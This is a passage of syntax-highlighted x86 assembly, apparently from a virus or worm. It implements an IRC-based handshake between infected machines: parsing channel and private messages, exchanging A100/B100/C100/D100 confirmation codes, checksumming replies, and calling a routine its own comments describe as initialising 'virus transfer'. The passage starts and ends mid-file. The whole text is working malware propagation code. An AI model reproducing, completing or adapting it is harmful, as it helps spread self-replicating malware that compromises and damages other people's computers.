</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; if we are in</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">awayfromit</span><span class="sc0">              </span><span class="sc1">; private mode</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'#'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notfromchannel</span><span class="sc0">                  </span><span class="sc1">; if we are not in chan</span><span class="sc0">

</span><span class="sc5">incrementit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">notfromchannel</span><span class="sc0">

</span><span class="sc1">;cmp    dword ptr [esi],'XGSM'          ; little hello to asmod :]</span><span class="sc0">
</span><span class="sc1">;jne    noquit</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;push   0</span><span class="sc0">
</span><span class="sc1">;call   ExitProcess</span><span class="sc0">

</span><span class="sc5">noquit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ActualSet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ly22</span><span class="sc0">        </span><span class="sc1">; load the set</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; we are not in step 2</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">incrementit</span><span class="sc0">             </span><span class="sc1">; of communication</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'D100'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notBBreply</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkconfirmation12</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">notBBreply</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; confirmation received</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Message1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ly377</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipthisline</span><span class="sc0">                </span><span class="sc1">; check if we have the same</span><span class="sc0">
                        </span><span class="sc1">; user than our</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; load remote user</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Remote</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ly4</span><span class="sc0">            </span><span class="sc1">; save it there</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">layer4init</span><span class="sc0">              </span><span class="sc1">; initalizing virus virus </span><span class="sc0">
                        </span><span class="sc1">; transfer</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ActualSet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ly5</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; set actual set</span><span class="sc0">

</span><span class="sc5">skipthisline</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notBBreply</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'C100'</span><span class="sc0">          </span><span class="sc1">; watch if we have a free</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notBreply</span><span class="sc0">               </span><span class="sc1">; confirmation</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkconfirmation12</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">notBreply</span><span class="sc0">               </span><span class="sc1">; confirmation</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Message1</span><span class="sc4">,</span><span class="sc5">ly3107</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skipBBreply</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                  </span><span class="sc1">; set it</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; we received it</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'D100'</span><span class="sc0">          </span><span class="sc1">; and then, we confirmed it</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; it's our </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Remote</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ly6</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; set the remote</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Message1</span><span class="sc4">,</span><span class="sc5">ly7</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; my</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; load our ID</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">channelsend12</span><span class="sc0">               </span><span class="sc1">; send it</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ActualSet</span><span class="sc4">,</span><span class="sc5">ly8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; set state</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; finish</span><span class="sc0">

</span><span class="sc5">skipBBreply</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notBreply</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'B100'</span><span class="sc0">          </span><span class="sc1">; check if replied my ask</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notM2communication</span><span class="sc0">          </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkconfirmation12</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">notM2communication</span><span class="sc0">          </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ActualSet</span><span class="sc4">,</span><span class="sc5">ly3105</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">skipBreply</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Message1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ly3152</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skipBreply</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'C100'</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Message1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ly3155</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">channelsend12</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ActualSet</span><span class="sc4">,</span><span class="sc5">ly3187</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">skipBreply</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notM2communication</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'A100'</span><span class="sc0">          </span><span class="sc1">; load Hello</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">incrementit</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkconfirmation8</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">incrementit</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkoneA</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">incrementit</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                  </span><span class="sc1">; reply confirmation</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">movsd</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Message1</span><span class="sc4">,</span><span class="sc5">ly9</span><span class="sc0">            </span><span class="sc1">; set the message</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; put our ID with 001B</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">channelsend12</span><span class="sc0">               </span><span class="sc1">; send to chan</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">notfromchannel</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">awayfromit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'#'</span><span class="sc0">          </span><span class="sc1">; if we have a #</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">incrementit</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Remote</span><span class="sc4">,</span><span class="sc5">ly10</span><span class="sc0">         </span><span class="sc1">; then check who is the remote</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">cecuser</span><span class="sc4">,</span><span class="sc5">ly11</span><span class="sc0">            </span><span class="sc1">; load the user</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notfromchannel</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">layer4input</span><span class="sc0">             </span><span class="sc1">; set the layer</span><span class="sc0">

</span><span class="sc1">; layer 4 in action now!</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">directinput</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Remote</span><span class="sc4">,</span><span class="sc5">ly12</span><span class="sc0">         </span><span class="sc1">; load the remote</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">usersend</span><span class="sc0">                </span><span class="sc1">; and sun to user</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">layer3to4uninit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ActualSet</span><span class="sc4">,</span><span class="sc5">ly34195</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; return to an idle mode</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">channelsend12</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bifurcation1</span><span class="sc0">

</span><span class="sc5">channelsend8</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">bifurcation1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Message1</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc5">ly3289</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">getcrcvalthat</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getcrcvalthat</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'AB'</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'CD'</span><span class="sc0">

